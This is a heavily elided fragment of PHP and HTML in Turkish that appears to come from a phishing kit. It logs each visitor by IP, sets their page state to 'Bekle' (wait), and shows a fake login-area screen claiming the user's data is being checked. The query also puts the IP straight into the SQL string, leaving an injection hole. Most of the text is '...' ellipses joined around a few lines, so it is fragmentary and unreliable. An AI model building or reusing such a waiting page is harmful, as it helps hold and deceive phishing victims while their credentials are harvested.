...
$db->query("UPDATE logs SET sayfa='Bekle' WHERE ip = '{$ip}'");
...
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        ...
        <script src="./blackwine/jquery-3.4.1.min.js" type="text/javascript"></script>
        <style>
            *{
    ...
    $.ajax({
      ...
      if(msg=='hata'){
        ...
        <form id="loginform" name="loginform" method="post" action="">
                    ...
                    <img src="blackwine/bekle.gif" width="60px;"><br><br>
                    <b style="color:#666;">Lütfen Bekleyiniz.</b><br>
                Verileriniz sistemde sorgulanıyor.
                </ol>
                                        </div>
